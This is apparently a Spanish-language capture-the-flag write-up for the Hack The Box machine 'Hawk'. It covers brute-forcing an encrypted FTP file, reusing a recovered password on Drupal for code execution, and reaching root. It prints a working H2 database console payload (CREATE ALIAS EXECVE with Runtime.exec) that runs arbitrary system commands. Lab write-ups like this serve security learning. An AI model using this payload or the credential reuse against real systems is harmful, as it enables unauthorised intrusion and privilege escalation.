# HTB-Hawk


## NMAP 

![image](https://github.com/gecr07/HTB-Hawk/assets/63270579/fad289b8-7fd5-4005-abcf-e7cd1615c783)

Se tiene un archivo en el ftp

![image](https://github.com/gecr07/HTB-Hawk/assets/63270579/c06de564-3217-4c18-ae2f-bc323e070426)

Se puede usar el openssl-brute

> https://github.com/HrushikeshK/openssl-bruteforce

```
openssl aes-256-cbc -in file.txt -out file.crypted
```

Dentro encontramos una clave: PencilKeyboardScanner123


## RCE

El Drupal que encontramos re utilizamos la clave.

![image](https://github.com/gecr07/HTB-Hawk/assets/63270579/da8b4140-9f6b-40bf-bfbe-77351394e082)


![image](https://github.com/gecr07/HTB-Hawk/assets/63270579/0b6a325d-71ec-4b99-aa0f-cc6ba104e96b)


Entramos como el usuario www-data y si vemo el puero 8082 tenemo una base de datos H2

### H2 


Estamo dentro de la H2 Console. Usamos el truco de hackticks y entramos cuando no existe una base de datos

![image](https://github.com/gecr07/HTB-Hawk/assets/63270579/5d8377d9-2518-434b-b4d0-205581b4ab00)


```
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL EXECVE('id');

```

Y somo root...









































